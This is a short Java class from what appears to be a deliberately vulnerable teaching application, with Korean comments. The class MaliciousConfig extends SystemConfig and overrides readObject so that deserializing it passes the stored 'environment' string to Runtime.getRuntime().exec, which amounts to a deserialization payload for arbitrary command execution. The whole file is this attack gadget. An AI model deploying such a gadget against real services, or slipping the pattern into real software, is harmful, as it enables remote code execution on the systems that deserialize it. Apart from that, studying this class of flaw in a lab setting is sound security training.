package com.vulnapp.vulnerabilities.deserialization.payload;

import java.io.ObjectInputStream;

public class MaliciousConfig extends SystemConfig {

    public MaliciousConfig(String host, int port, String environment) {
        super(host, port, environment);
    }

    // 역직렬화 시 실행되는 메서드
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject(); // 부모 클래스의 멤버 변수 복원
        // environment 변수에 저장된 명령어 실행
        Runtime.getRuntime().exec(getEnvironment());
    }
}
